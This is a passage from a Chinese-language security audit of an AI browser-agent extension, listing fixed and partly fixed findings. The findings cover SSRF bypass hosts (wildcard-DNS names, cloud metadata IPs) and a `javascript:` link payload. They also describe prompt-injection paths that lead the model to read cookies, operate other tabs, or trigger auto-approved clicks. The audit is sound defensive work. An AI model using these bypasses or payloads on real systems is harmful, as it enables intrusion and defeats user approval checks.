- 与 `page` 工具 schema 的承诺不一致，模型难以察觉。

**建议**
已按上述方式实现；建议同时补上租约校验，或从 schema 中移除该动作对 `tab_id` 的支持并明确报错。

---

### 13. [已修复] 上下文压缩可能拆散 `function_call` / `function_call_output` 配对

**状态**
工作区已修复：`dropEnd` 落在 `function_call_output` 上时向前吞掉整个 output，保证 tail 不会以孤立 output 开头（`src/ai/context-manager.ts:74-83`）。

**位置**
- `src/ai/context-manager.ts:74-80`（`dropEnd = context.length - keepTail`）
- `src/ai/context-manager.ts:122-134`（拼接 `[首条用户消息, 摘要, ...tail]`）

**问题**
`keepTail` 是纯数量截断，`dropEnd` 可能落在一个 `function_call` 与其 `function_call_output` 之间。压缩后 `tail[0]` 可能是孤立的 `function_call_output`（对应的 call 被摘要替换），下一轮请求会带着一个找不到调用的 `call_id`。

**影响**
Responses API 对工具调用配对有严格要求，压缩后的下一轮请求可能直接 400（“No tool call found for call_id” / “tool_call 没有响应”），表现为长任务在压缩后突然失败。

**建议**
把 `dropEnd` 调整到“下一个完整的 `function_call` 边界”（向前/向后对齐到配对单元）；或对孤立的 output 做丢弃/转换为普通文本。增加压缩后的请求形状单测。

---

### 14. [已修复] `network.start` 会清空同标签页已有捕获

**状态**
工作区已修复：已在监听时保留既有缓冲与计时，仅首次 `start` 初始化；新增 `NETWORK_MAX_LISTEN_MS`（30 分钟）与 `lastEvictAt` 节流，在清理时到期自动停止（`src/lib/cdp-session.ts:409-516`）。

**位置**
- `src/lib/cdp-session.ts:409-516`（保留缓冲 + 最大监听时长）
- `src/lib/cdp-session.ts:440-461`（`evictStalePendingRequests` 的节流与到期停止）
- `src/functions/cdp-network.ts:263-280`（工具 `start` 直接调用）

**问题（基线 `f897245`）**
`startNetworkListening` 无条件重置事件数组与 pending 表。两个客户端（或同一客户端重复 `start`）操作同一标签页时，后一次会清掉前一次捕获的请求；`pendingTimeout` 没有定时器，只有读取时才剪枝，长期监听但无人读取的标签页会持续累积 pending。

**影响**
- 跨客户端的数据丢失，审计/调试结果不可复现。
- 长时间捕获的网络请求元数据无上限增长，且 `cleanupTabState` 有意保留 `networkEvents`，会跨任务残留。
- `networkListening.active` 为 true 时 `scheduleIdleDetach` 直接返回（`src/lib/cdp-session.ts:181-189`），客户端忘记 `stop` 会让 debugger 一直附着在标签页上。

**建议**
已按上述方式实现；建议补充“重复 start 不清空”“到期自动 detach”的测试。

---

### 15. [已修复] 任务状态与结果持久化已加保留上限，仍可能被大字段撑爆

**状态**
工作区已修复主要部分：仅保留最近 50 个终态任务，`result` 超过 16KB 时截断，restore 时同样裁剪；`error.message` 限制 2000 字符、`ownedTabIds` 只保留最近 50 项（`src/background/task-manager.ts:17-40`）；`BrowserTask` 没有 `input` 字段，原建议中的 input 上限不适用。`storage.ts`/`session-persistence.ts` 现在检查 `chrome.runtime.lastError` 并 reject/记录日志（`src/lib/storage.ts:19-66`；`src/background/session-persistence.ts:23-37`）；`legacy-storage.ts` 的调用方直接传入 Promise 化的 `chrome.storage.local`，配额错误会以 rejection 传播。

**位置**
- `src/background/task-manager.ts:9-35`（`sanitizeTaskForPersist`）
- `src/background/task-manager.ts:70-80`（`pruneTerminalTasks`）
- `src/background/task-manager.ts:243-260`（`persist`）
- `src/lib/storage.ts:19-66`、`src/background/session-persistence.ts:23-37`

**问题（基线 `f897245`）**
`TaskManager` 从不删除终态任务，`actspan_task_state` 会保存所有历史任务及其 `result`（可能是整页内容/截图元数据），随使用时间无限增长。`chrome.storage.local.set` 在超配额时会设置 `lastError` 但回调仍被调用，这些包装器把失败当成功，调用方无法感知。

**影响**
- 达到配额后写入静默失败，任务/会话状态丢失且无日志。
- 旧任务结果（可能含用户数据）长期留在本地，扩大隐私面。

**建议**
已按上述方式实现；建议对 `input` 也做同样的字节上限，并让 `legacy-storage.ts` 复用同一错误检查。

---

### 16. [已修复] 会话历史中的 `assistantReply` 没有长度上限

**状态**
工作区已修复：新增 `MAX_ASSISTANT_REPLY_CHARS = 8_000`，写入历史时截断并标注（`src/background/session-history.ts:240-245`、`:264`）。

**位置**
- `src/background/session-history.ts:240-245`（截断）
- `src/session-history/constants.ts`（`MAX_SESSION_HISTORY = 120`）

**问题（基线 `f897245`）**
每条历史保留完整助手回复，没有按字符/字节截断；页面正文被模型复述时单条可达数十 KB。120 条 × 多条会话，再叠加 runtime 快照、任务状态、截图 artifact，容易触发 10MB 配额；而写入错误又被吞掉（见第 15 条）。

**影响**
历史写入静默丢失，用户会看到“历史记录不完整/重启后消失”，且难以排查。

**建议**
已按上述方式实现；建议对整体历史 JSON 再做一次字节上限。

---

### 17. [已修复] `__fetch_page_title` 的 SSRF 防护仍有 IPv6 映射绕过

**状态**
静态确认已修复：`src/lib/ssrf-guard.ts:15-66` 使用 IPv6 分组解析，覆盖 IPv4-mapped（`::ffff:7f00:1`）与 IPv4-compatible、`fc00::/7`、`fe80::/10`；`channel-handlers.ts` 的 `fetchPublicHtml` 对 `redirect:'manual'` 的 `opaqueredirect` 直接抛错（fail-closed），不再假装逐跳校验。功能取舍：所有会重定向的链接标题预览会为空。以下保留基线分析。

**位置**
- `src/background/channel-handlers.ts:61-130`
- `src/lib/ssrf-guard.ts:13-29`（`isPrivateHostname`）
- `src/lib/ssrf-guard.ts:31-39`（`isBlockedFetchUrl`）

**问题（基线 `f897245`）**
该处理器接受内容脚本传来的任意字符串 URL，直接用扩展身份 `fetch`（无 CORS 限制、无协议/主机白名单、无私有网段拦截），并把 `<title>` 回传。调用方（结果视图中的链接 chip）会把模型输出里的链接逐条发来。`pageTitleCache` 以 URL 为键、无淘汰。

**影响**
- 提示注入可以让扩展去探测/读取内网或本机服务（`http://127.0.0.1:*`、路由器后台等），并通过标题/错误差异回传结果。
- 大量唯一链接可让缓存无限增长。

**建议**
- 用真正的 IPv6 解析（或成熟库）判断 `::ffff:0:0/96`、`::/128`、`fc00::/7`、`fe80::/10` 等网段，不要依赖字符串正则。
- 不要用 `redirect:'manual'` 读取 `Location`（浏览器会隐藏）；改为在扩展侧用 `chrome.webRequest`/DNS 预解析，或直接禁止重定向并提示用户。
- 缓存已加 200 上限，可保留。

---

### 18. [已修复] Markdown 渲染没有协议白名单/消毒，链接可注入 `javascript:`

**状态**
工作区已修复：`sanitizeUrlForAttr` 仅允许 `http:`/`https:`/`mailto:`，对链接/图片逐个校验；占位符改为随机前缀的私有区字符，避免 `%%SLOT0%%` 碰撞；图片加 `referrerpolicy="no-referrer"`（`src/content/float-ball/markdown.ts:17-80`）。新增 `src/content/float-ball/markdown.test.mjs`。

**位置**
- `src/content/float-ball/markdown.ts:17-80`（协议白名单 + 随机占位符）
- `src/content/float-ball/components/ResultView.tsx:142`、`:194-230`（仍是 `dangerouslySetInnerHTML`，但输入已消毒）

**问题（基线 `f897245`）**
`escapeHtml` 只能防止引号/尖括号破坏属性，不能阻止 `[x](javascript:alert(1))`、`data:`、任意远程图片。`%%SLOTn%%` 占位符还能与模型输出文本碰撞（模型只要输出 `%%SLOT0%%`，就会被替换成第一个链接/图片标记），可用于伪造链接位置。

**影响**
- 用户点击模型输出中的链接会在页面上下文执行脚本（`javascript:`）或加载远程跟踪图片。
- 占位符碰撞造成内容欺骗（把攻击者 URL 渲染成可信文案）。

**建议**
已按上述方式实现；建议再引入 DOMPurify 或改为结构化 AST → React 元素渲染，作为 `dangerouslySetInnerHTML` 的纵深防御。

---

### 19. [已修复] LLM endpoint 未校验，允许 `http://` 明文发送 API Key；UA 伪装成 `claude-code`

**状态**
工作区已修复：新增 `validateEndpoint`，默认只允许 https，仅本机 `localhost/127.0.0.1/::1` 允许 http；拒绝 URL 内嵌账号密码；保存设置与每次请求都会校验；已移除 `claude-code` UA（`src/ai/llm-client.ts:152-196`、`:258-269`、`:381-390`；`src/options/pages/LLMSettingsPage.tsx`）。

**位置**
- `src/ai/llm-client.ts:218-224`、`:338-344`（`fetch(settings.endpoint)`）
- `src/ai/llm-client.ts:223`、`:343`（`User-Agent: 'claude-code/1.0.0'`）
- `src/options/pages/LLMSettingsPage.tsx:22-23`（只检查非空）

**问题**
设置页和客户端都不校验 endpoint 的协议/主机。用户（或被诱导）填入 `http://...` 时，`Authorization: Bearer <apiKey>` 会以明文发出；`User-Agent` 伪装成其他产品，可能违反服务条款，也会让网关的审计/限流误判。

**影响**
API Key 在链路中被窃听；上游服务可能封禁或误路由。

**建议**
- 默认只允许 `https://`；对 `http://localhost` 给出显式警告并要求二次确认。
- 校验 URL 可解析、无 userinfo、无异常端口；保存前规范化。
- 使用产品自己的 UA，或省略 UA。

---

### 20. [已修复，残余见第 33 条] `cdp_frame.evaluate` 标为 `read`，可绕过存储/Cookie 的敏感审批

**状态**
工作区已把 `evaluate` 提升为 `sensitive`（`src/functions/cdp-frame.ts:93-97`），`mcp-bridge.test.mjs` 也改为要求显式批准。第 31 轮复核发现 `snapshot` 通过递归调用 `evaluate` 绕过该审批，见第 33 条。

**位置**
- `src/functions/cdp-frame.ts:91-95`（`actionPermissions: { evaluate: 'read' }`）
- `src/functions/cdp-frame.ts:225-235`、`:260-269`（`Runtime.evaluate` + `throwOnSideEffect: true`）
- 对照：`src/functions/cdp-dom.ts:209-214`（`storage_get_items` 等为 `sensitive`）
- 对照：`src/functions/cdp-network.ts:105`（`get_cookies` 为 `sensitive`）

**问题**
`evaluate` 的表达式在页面上下文执行，`throwOnSideEffect` 只阻止“可观察的写副作用”，**不阻止读取**。`document.cookie`（非 HttpOnly）、`localStorage`、`sessionStorage`、页面全局变量都是“无副作用读取”，会正常返回；但同一能力的专用工具（`cdp_dom.storage_get_items`、`cdp_network.get_cookies`）却要求 `sensitive` 审批。工具描述里“不要用 evaluate 读 storage/cookie”只是提示，不是强制。

**影响**
- 模型（或被提示注入的页面）可以用 `cdp_frame.evaluate` 在无确认的情况下读取当前站点与跨域 iframe 的存储/Cookie，完全绕过第 3 条之外的另一条敏感数据通道。
- `throwOnSideEffect` 是 V8 的“尽力而为”检查，不是沙箱；把它当作“只读安全边界”会带来错误的安全假设。

**建议**
- 把 `evaluate` 提升为 `sensitive`（至少在返回结果命中 `cookie|token|storage|session` 等敏感特征时），或在执行后对返回值做脱敏。
- 在表达式入口做静态限制（禁止 `document.cookie`、`localStorage`、`sessionStorage`、`indexedDB` 等标识符），并在文档中明确 `throwOnSideEffect` 不是安全边界。
- 保留专用工具作为唯一被审计的敏感读取通道。

---

### 21. [已修复] 租约 10 分钟过期后没有 reclaim 路径；标签页关闭不释放租约

**状态**
已按当前代码关闭主要部分：新增 `reclaim()` 与 `releaseTab()`，`tabs.onRemoved` 会同时释放租约并清理 MCP 信任（`src/background/tab-lease-manager.ts:184-238`；`src/background/channel-handlers.ts:192-196`；`src/background/mcp-bridge.ts:1605-1612`）；`resolveTab` 的 `authorizeOrReclaim` 只在写操作或原所有者请求时接管过期/已释放租约，只读请求不会抢占他人的标签页；`pruneTerminalTasks` 淘汰任务时释放其租约（`src/background/task-manager.ts:79-87`）。**残余**：无。`pruneTerminalTasks` 已改为先 `closeOwnedTabs`（异步等待关闭并释放租约）再删除任务，`pruning` 集合防止并发重复淘汰（`src/background/task-manager.ts:46-47`、`:79-96`）。

**位置**
- `src/background/tab-lease-manager.ts:3-4`（`LEASE_TTL_MS = 10 分钟`）
- `src/background/tab-lease-manager.ts:167-181`（`authorize` 只刷新，不重建）
- `src/background/tab-lease-manager.ts:183-200`（`release` 标记，不删除）
- `src/background/mcp-bridge.ts:712-730`（`resolveTab` 发现 lease 记录就 `authorize`）
- `src/background/mcp-bridge.ts:1562-1564`（`tabs.onRemoved` 只发事件）
- `src/background/channel-handlers.ts:158-162`（另一个 `onRemoved` 只 detach CDP）

**问题**
`authorize` 对 `releasedAt` 或 `expiresAt <= now` 的租约直接抛 `E_TAB_OWNERSHIP`，而 `resolveTab` 只要看到该标签页有 lease 记录就会走 `authorize`，没有“同会话重新 acquire”的分支。MCP 客户端在 `tab.open` 后如果 10 分钟没有操作，或任务/会话释放了租约，后续 `page.*`/`cdp_*` 会持续失败，只能重新 `tab.open`。标签页关闭时也没有清理租约与 `ownTabs`。扩展自身每轮会重新 `acquire`（`session-manager.ts:679`），所以主要影响 MCP 路径与长驻客户端。

**影响**
- 长时间任务的后续轮次可能莫名报“未拥有标签页”，且没有恢复手段。
- `leases`/`ownTabs` 残留会随标签页关闭累积，持久化体积变大。

**建议**
- 允许同一 `clientId`/`sessionId`/`taskId` 在租约过期或释放后重新 `acquire`（或提供显式 `tabs.claim`）。
- 在 `tabs.onRemoved` 中调用 `tabLeaseManager.release(taskId, tabId)` 与 `taskManager.releaseOwnedTab`。
- 定期清理已释放/过期的租约记录，并让 `tabs.list` 不返回已过期的租约。

---

### 22. [已修复] `waitForTabComplete` 对“已经加载完成”的标签页会一直等到超时

**状态**
工作区已修复：先注册监听，再用 `chrome.tabs.get` 检查当前 `status === 'complete'`，并用 `settled` 防止重复 resolve/reject（`src/functions/tab-utils.ts:56-94`）。

**位置**
- `src/functions/tab-utils.ts:44-81`
- 调用方：`src/functions/fetch-url.ts:26`、`:112`、`src/functions/debug-tab-isolation.ts:9`（`screenshot.ts:14-23` 已先判断 `status`，不受影响）

**问题**
函数只注册 `tabs.onUpdated` 监听，不先检查当前 `tab.status`。如果标签页在监听注册前就已经 `complete`（缓存页、`about:blank`、极快的本地页），再也不会收到 `complete` 事件，只能等到超时（默认 24s/15s）后报错。

**影响**
`fetch_url` 与隔离调试在快速页面/缓存页上会随机超时，且表现为“页面加载超时”而非明确的状态判断错误。

**建议**
先 `chrome.tabs.get(tabId)` 判断 `status === 'complete'`，再注册监听；或用轮询 + 事件双保险。

---

### 23. [已修复] `tab.open` 没有 URL/协议校验，且是否需要审批取决于是否绑定了 `tabId`

**状态**
工作区已修复：`isSafeNavigableUrl` 限制 `http/https` 与 `about:blank`（`src/lib/ssrf-guard.ts:41-49`），`tab.open`/`tab.navigate` 在 bridge 与扩展工具两处都校验；`tab.open` 已纳入 `tabScoped`（`src/background/policy-executor.ts:38-43`；`src/background/mcp-bridge.ts:863-870`、`:894-900`；`src/functions/tab-navigate.ts:93-99`、`:127-133`、`:163-169`）。

**位置**
- `src/background/policy-executor.ts:40-42`（`tabScoped` 不含 `tab.open`）
- `src/background/mcp-bridge.ts:850-876`（`chrome.tabs.create({ url: String(params.url) })`）

**问题**
`tab.open` 直接把客户端传入的字符串交给 `chrome.tabs.create`，没有协议白名单。审批规则是 `interact && (tabScoped || context.tabId !== undefined)`，因此同一个 `tab.open` 在会话有 `tabId` 时会弹确认，在没有时会静默执行；行为不一致。`file://`（若用户开启了文件访问）、`data:` 等都可能被打开。

**影响**
- 客户端可静默打开任意 URL，配合 `page_viewer`（第 3 条）读取本地/内网页面。
- 审批策略不可预测，审计困难。

**建议**
校验 `http/https`（必要时允许 `about:blank`），显式拒绝 `file/data/javascript`；把 `tab.open` 也纳入 `tabScoped` 或统一要求确认。

---

### 24. [已修复] 动态工具权限可自声明，且响应/清单已限流

**状态**
已修复：动态工具规范新增 `permissionLevel` / `actionPermissions`，清单只能把权限上调到 `dangerous`，其余一律按 `sensitive` 处理（`src/functions/registry.ts:266-278`）；`getRegisteredFunction` 会查 MCP 注册表（`:173-176`）。endpoint 在导入与执行前都调用 `isBlockedFetchUrl`（`:253-256`、`:418`），`redirect: 'manual'` + 3xx/opaqueredirect 检查阻止重定向绕过（`:427-439`）；响应体限制 5MB、manifest 限制 1MB，导入结果会展示 endpoint 摘要（`:33-64`、`:595-708`）。新增 `src/functions/registry-dynamic.test.mjs` 覆盖 loopback/内网、manifest、重定向；第 28 轮验证 4 pass 且 typecheck 通过。仍无导入前的二次确认，但已不构成审批绕过。以下保留基线分析。

**位置**
- `src/functions/registry.ts:266-282`（接受清单自声明的 `permissionLevel` / `actionPermissions`）
- `src/functions/registry.ts:483-490`（`toFunctionDefinition` 使用该声明）
- `src/ai/tool-executor.ts:170-185`（`getRegisteredFunction` 查到动态工具后直接采用其声明）
- `src/functions/registry.ts:33-64`、`:590-620`（响应体 5MB、manifest 1MB 上限，已修复）

**问题**
动态工具注册在 `mcpServer`，不在 `builtinToolMap`。本轮修复让 `resolvePermissionLevel` 能查到动态工具，但也直接信任了清单里的权限声明：清单写 `permissionLevel: "read"` 就按只读执行，而动态工具的执行体是“向 endpoint 发任意 HTTP 请求”，具备外发数据能力。

**影响**
- 恶意/被篡改的 manifest 可把自己标成只读，绕过默认 `sensitive` 审批，把参数发往外部地址。
- `actionPermissions` 可进一步把敏感 action 标成 `read`。

**建议**
- 动态工具以 `sensitive` 为下限，只允许向上声明 `dangerous`，禁止声明 `read`/`interact`。
- 导入时展示 endpoint/权限并要求用户显式确认；对 endpoint 复用 `fetch_url` 的 SSRF 校验。

---

### 25. [已修复] MCP 的 `trustAll` 作用域过宽，`dangerous` 能力可被跳过审批

**状态**
静态确认已修复：`mcp-bridge.ts:663-668` 的 `alwaysConfirm` 包含 `decision.level === 'dangerous'` 与支付，`trustedByUser` 只在 `typeof tabId === 'number'` 时成立；写入信任也要求明确 `tabId`（`:689-692`）。标签页关闭会清理该 tab 的信任键（`:1607-1609`），不会再出现 `session:all` 或 id 复用继承。以下保留基线分析。

**位置**
- `src/functions/request-confirmation.ts:44-59`（只发往 `context.tabId`，60s 超时）
- `src/functions/request-confirmation.ts:73-77`（校验响应来源标签页）
- `src/background/mcp-bridge.ts:663-690`（MCP 的 `trustAll` 记忆与 15s 审批）

**问题**
广播与 5 分钟等待已修复；MCP 路径也实现了 `trustAll`。剩余问题：
1. `trustedByUser` 未排除 `dangerous`，普通确认的信任会放行 `page.eval`（R2-1）。
2. 信任键为 `sessionId:tabId`，`tabId` 缺省时退化为 `session:all`，作用域覆盖该会话所有标签页。

**影响**
- 一次普通确认可升级为无审批的任意页面脚本执行。
- `tabId` 缺省的会话中，信任范围比用户看到的“当前标签页”更宽。

**建议**
- `trustedByUser` 同时要求 `decision.level !== 'dangerous'`。
- 无明确 `tabId` 时不要写入 `session:all`，或把该键限制在只读能力。
- 信任条目增加过期/会话结束清理。

---

### 26. [已修复] 开放 Shadow DOM 暴露审批/提问/录制控件，页面脚本可自动批准

**位置**：`src/content/float-ball-react.tsx:21-25`、`src/content/float-ball/components/Trigger.tsx:14-108`、`:333-338`。

`createFloatBallShadowHost` 使用 `attachShadow({ mode: 'open' })`，宿主 `id="actspan-root"`；`PillActionCard` 在开放 shadow 内渲染 `.pac-approve`、提问选项和文本输入，点击后直接发送 `__approval_response`/`__ask_user_response`。页面脚本可读取 `document.getElementById('actspan-root').shadowRoot`，轮询审批卡片并调用 `.click()`，从而在用户未操作时批准 `page.eval` 等敏感/危险操作，或代替用户回答提问；也可读取审批消息与用户输入。`float-ball-shadow.test.mjs:128-138` 当前明确要求 shadowRoot 对页面可达，需同时调整契约。

**建议**：审批/提问 UI 移出开放 shadow（closed root 或 side panel）；在按钮处理函数检查 `event.nativeEvent.isTrusted`；background 侧把 `requestId` 与发起标签页/会话绑定。**确认**：静态路径已证实，需真实 Chrome 验证脚本点击。

**状态**：已修复。`createFloatBallShadowHost` 改用 `attachShadow({ mode: 'closed' })`，页面脚本无法通过 `host.shadowRoot` 读取审批文案、用户输入或合成点击；内容脚本通过闭包内的 `shadow` 引用继续挂载 React（`src/content/float-ball-react.tsx:17-38`）。`PillActionCard` 与 `ApprovalCard` 的处理函数仍保留 `event.nativeEvent.isTrusted` 校验作为第二层防护（`Trigger.tsx:30-66`、`ApprovalCard.tsx:30-48`）；`float-ball-shadow.test.mjs` 契约已同步为 `shadowRoot === null` 且 `mode === 'closed'`。残余风险：扩展进程内被注入的脚本仍可访问闭包引用，但这已超出页面脚本威胁模型。

---

### 27. [已修复] 常驻 AI 未禁用统一 `agent`，无任务身份时跳过租约，子代理可跨标签页操作

**位置**：`src/background/resident-ai.ts:49`、`src/ai/orchestrator.ts:119`、`:137-140`、`src/ai/tool-executor.ts:178-180`、`:279-301`、`:303-317`、`src/ai/core-loop.ts:588-624`。

`runResidentAIResponse` 用 `maxRounds: 1`、`disallowTools: ['resident_runtime', 'spawn_subtask']` 调用 `handleChat`，且没有传 `toolContext`。`handleChat` 仍注入 `getSubagentSchemas()` 返回的统一 `agent` 工具，禁用列表没有它；`resolvePermissionLevel` 对 `isAgentTool` 直接返回 `interact`，不会触发审批；`executeSingleTool` 的跨标签页租约校验又依赖 `executionContext?.taskId`，常驻调用没有 `taskId`，整段被跳过。模型一旦返回 `agent({type:'subtask', goal:'…', tab_id:<victim>})`，`agentRunner` 会把受害标签页当作子代理的当前标签页，子代理内部的 `page`/`cdp_input`/`tab_navigate` 等工具不再走跨标签页路径，即可在无确认、无租约的情况下读取或操作任意标签页。常驻任务的检测数据来自页面，存在 prompt injection 触发面。

另：`disallowTools` 当前只在 `orchestrator` 里过滤 schema，执行器并不校验调用名；`spawn_subtask`/`explore`/`plan`/`review` 等旧别名仍被 `isAgentTool` 识别。即使把 `agent` 加入禁用列表，也应把允许集合下沉到 `executeToolCalls`。

**建议**：常驻 AI 禁用 `agent` 与 `LEGACY_AGENT_MAP` 全部键；无 `toolContext.taskId` 时拒绝 agent；`agentRunner` 内重新解析并校验目标标签页；执行器维护实际允许的工具集合，而不是只过滤 schema。**确认**：静态路径已证实；需真实 Chrome 常驻任务 + 页面注入验证。

**状态**：已修复。`runResidentAIResponse` 的 `disallowTools` 现使用 `getSubagentNames()`，覆盖 `agent` 及全部旧别名（`src/background/resident-ai.ts:56-61`）；`ToolExecutionContext` 新增 `disallowedTools`，`agenticLoop` 合并禁用集合并传给 `executeToolCalls` 与子代理，执行器在调用前拒绝禁用工具，模型伪造未出现在 schema 中的名字也无法执行（`src/ai/core-loop.ts:416-427`、`src/ai/tool-executor.ts:278-291`）。

---

### 28. [部分修复] SSRF 守卫只做字面量判断，通配 DNS 可解析到内网

**位置**：`src/lib/ssrf-guard.ts:56-70`、`src/functions/fetch-url.ts:54-60`、`:119-124`。

`isBlockedFetchUrl` 只对 `URL.hostname` 调 `isPrivateHostname`，不解析 DNS，也不拒绝已知通配 DNS 域。`http://127.0.0.1.nip.io:8080/`、`http://localtest.me/`、`http://169.254.169.254.sslip.io/` 等主机名既不是私有 IP 字面量，也不以 `localhost`/`.local` 结尾，因此会通过校验；浏览器随后把域名解析到 `127.0.0.1`/`169.254.169.254` 等地址。`via:'extension'` 直接 `fetch`，`via:'page'` 在隐藏标签页的 MAIN world 中 `fetch(..., {credentials:'include'})`；文本和二进制路径都是请求完成后才复检最终 URL，无法阻止请求本身。审批文案只会显示 `*.nip.io` 这类看似公网的域名。该路径不同于第 7 条的重定向问题和第 17 条的 IPv6 字面量问题，注释中“仅做字面量判定”的限制也没有对通配 DNS 做最低限度封堵。

**建议**：拒绝 `nip.io`/`sslip.io`/`xip.io`/`localtest.me` 等已知通配 DNS 域及其子域；对可解析域名做 DNS 解析并校验所有 A/AAAA；`fetch` 使用 `redirect:'manual'` 并逐跳校验，或禁止跨源重定向；`via:'page'` 在读取前校验隐藏标签页最终 URL。**确认**：静态路径已证实；需真实 Chrome + DNS 验证解析与实际可达性。

**状态**：已封堵已知通配 DNS 服务（`nip.io`/`sslip.io`/`xip.io`/`localtest.me`/`lvh.me`/`vcap.me`/`traefik.me`/`lacolhost.me` 及其子域，`src/lib/ssrf-guard.ts:56-80`），新增 `ssrf-guard.test.mjs` 用例。任意自定义域名解析到内网（DNS 重绑定）仍需浏览器网络栈或代理解析层校验，暂无法在扩展 JS 内彻底消除，保留为残余风险。

---

### 29. [已修复] `bookmark_ops` 的写入动作和全量导出被标成 `read`，可静默篡改/导出收藏

**位置**：`src/functions/bookmark-ops.ts:163-165`、`:171`、`:235-288`、`:316-370`、`:449-502`、`:504-525`。

定义默认 `permissionLevel: 'read'`，只为 `delete` 覆盖为 `sensitive`；`add`/`update`/`move`/`create_folder` 以及 `getAll`/`get_all` 都按 `read` 解析，`tool-executor` 不弹确认。页面可诱导模型把用户收藏 `update` 成钓鱼 URL、`add` 恶意书签或 `move` 到显眼位置，也可用 `getAll` 把全部收藏 URL/标题送入模型上下文；`add`/`update` 未校验 URL 协议，静态上可传入 `javascript:` 等值（真实 Chrome 是否执行需验证）。建议按 action 分级：读取类保持 `read`，写入类提升 `sensitive`/`dangerous` 并补审批文案；校验 URL 协议；全量导出加确认或租约限制。**状态**：已修复。`actionPermissions` 将 `add/update/move/create_folder/delete/getAll/get_all` 全部提升为 `sensitive` 并补审批文案；`add`/`update` 只接受 http/https，标题去除控制字符并限长 500（`src/functions/bookmark-ops.ts:162-181`、`:241-267`、`:335-348`）。新增 `bookmark-ops.test.mjs` 3 例。



**第 31 轮修复**：`search`、`recent`、`list` 均已提升为 `sensitive` 并补审批文案；`recent`/`list` 同样能遍历大量收藏，一并关闭。`bookmark-ops.test.mjs` 覆盖全部批量动作的权限等级。

### 30. [部分修复] `download_file` 以 `interact` 静默执行，缺少 SSRF 校验且可写任意文本文件

**位置**：`src/functions/download-file.ts:32`、`:55-69`、`:71-112`。

`permissionLevel: 'interact'`，无 action 级覆盖，因此不弹审批；`validate` 只检查 http/https，不复用 `isBlockedFetchUrl`/`isCredentialUrl`；`execute` 以 `saveAs:false` 直接把 URL 交给 `chrome.downloads.download`，也可把任意 `content`（最大 10MB）按模型指定的文件名写入 Downloads。页面可诱导模型请求 `http://127.0.0.1/...`/`169.254.169.254` 或投放 `.command`/`.html` 文件。建议至少提升为 `sensitive`、复用 SSRF/凭据 URL 校验、限制文件名与可执行后缀、URL 下载与 content 写入分别确认（或 `saveAs:true`）。**状态**：部分修复（主体已修复，保留盲 SSRF 残余）。`permissionLevel` 提升为 `sensitive` 并补审批文案；`validate` 复用 `isBlockedFetchUrl`/`isCredentialUrl`；文件名只保留 basename、去除控制字符、限长 200，并拒绝 `command/sh/bat/ps1/exe/app` 等可执行后缀（`src/functions/download-file.ts:9-27`、`:46-47`、`:69-84`）。新增 `download-file.test.mjs` 3 例。

**第 31 轮修复**：URL 下载现在始终显式传入由 URL 路径推导并清洗过的文件名（无路径时回退 `actspan-download`），可执行后缀会在下载前被拒绝；文件名清洗同时拒绝 Windows 保留名与尾随点/空格。新增 `download-file.test.mjs` 覆盖 URL 推导 `.command` 与 `CON.txt`。残余：`chrome.downloads.download` 仍会跟随 302，Downloads API 无法像 `fetch` 一样读取最终 URL 并在跳转到内网前阻断，只存在盲 SSRF（响应体不回传）；已通过 `sensitive` 审批、初始 SSRF/凭据校验和通配 DNS 拦截降低风险，彻底关闭需要 `webNavigation`/代理解析层或禁用跨源重定向。

### 31. [已修复] `timer` 的 list/update/clear 不校验任务归属，且全程无审批，可跨会话取消/篡改定时任务

**位置**：`src/functions/timer.ts:96-100`、`:223-255`、`:269-351`、`:354-446`、`:448-492`；`src/lib/timer-store.ts:7-35`（`TimerTask` 只有 `tabId`，无 `sessionId`/`taskId`/`owner`）。

`timer` 声明 `permissionLevel: 'interact'`，所有动作都不弹确认；`TimerStore` 是全局数组，`list` 返回所有定时器的 `timer_id`、`name`、`action`，`update`/`clear` 只按 `timer_id` 查找，不检查当前会话/任务是否拥有该定时器。页面提示注入可枚举并取消其他会话的提醒，或改写未来 `task_action`；定时器触发时 `handleTimerTrigger` 会用该文本在原 `tabId` 创建新会话执行（`timer-dispatch.ts:108-133`）。同一入口也没有每会话/全局数量上限，可用于持久化提示注入和消耗模型配额。建议在 `TimerTask` 保存归属信息并按上下文授权，`set_*`/`update`/`clear` 提升为 `sensitive`，增加数量上限并在任务结束时清理。**状态**：已修复。`TimerTask` 新增 `taskId/sessionId/owner`，创建时写入；`update`/`clear` 校验归属，`list` 对有身份的调用只返回自己的定时器（无归属的旧数据仅允许用户 UI 操作）；`set_timeout/set_interval/set_schedule/update/clear` 提升为 `sensitive`；新增每任务 20、全局 100 的数量上限（`src/lib/timer-store.ts:19-27`、`src/functions/timer.ts:15-65`、`:117-137`、`:203-219`、`:560-575`）。新增 `timer.test.mjs` 2 例覆盖跨任务隔离。

**第 31 轮修复**：无归属旧定时器现在只允许用户 UI（无任务/会话身份）操作，任何 AI 会话即使通过审批也会被拒绝；常驻 AI 传入 `{ owner: 'extension-agent' }` 后 `list` 返回空，不再枚举全部定时器。`timer.test.mjs` 新增常驻无身份 list/legacy clear 用例。`TimerStore` 的并发读改写仍归入 P2 第 30 条。

---

### 32. [已修复（第 37 轮）] `tab_navigate(open)` 的初始审批/SSRF 已关闭，保留 302 最终地址残余

**状态**
第 37 轮已修复：`open` 创建标签页后等待首次加载完成，复检 `chrome.tabs.get(...).url`；最终地址为本机/内网/非 http(s) 时立即关闭标签页并返回失败，`about:blank` 保持放行；新增 `tab-navigate-ssrf.test.mjs` 覆盖 loopback、通配 DNS、云元数据拒绝与 302 到内网关闭。以下保留基线分析。

**位置**：`src/functions/tab-navigate.ts:36-50`、`:94-104`、`:132-151`；`src/ai/tool-executor.ts:218-226`；`src/lib/ssrf-guard.ts:88-96`；`src/ai/loop-config.ts:179-184`。

**问题**
第 31 轮修复把 `open` 提升为 `sensitive` 并补审批文案，在 `validate`/`execute` 调用 `isBlockedFetchUrl`，且 `isAlwaysConfirmOperation` 对 `action='open'` 返回 true；直接指向 `127.0.0.1`/`169.254.169.254`/通配 DNS 的 URL 已被拒绝，`trustAll` 也不能跳过。审查代理也已从 `REVIEW_ALLOWED_TOOLS` 移除 `tab_navigate`（`src/ai/loop-config.ts:179-184`），不再有未追踪的 `open`。仍有一个缺口：
- `chrome.tabs.create` 会跟随 302，初始 URL 是公网不代表最终地址是公网；`open` 没有像 `screenshot`/`fetch_url` 那样在加载后复检 `chrome.tabs.get(tab.id).url`，公网 302 到 `127.0.0.1`/内网仍会发出请求（盲 SSRF）。

**触发路径**
1. 页面注入（或用户请求）让模型用 `page`/`extract_data`（read）读取敏感文本。
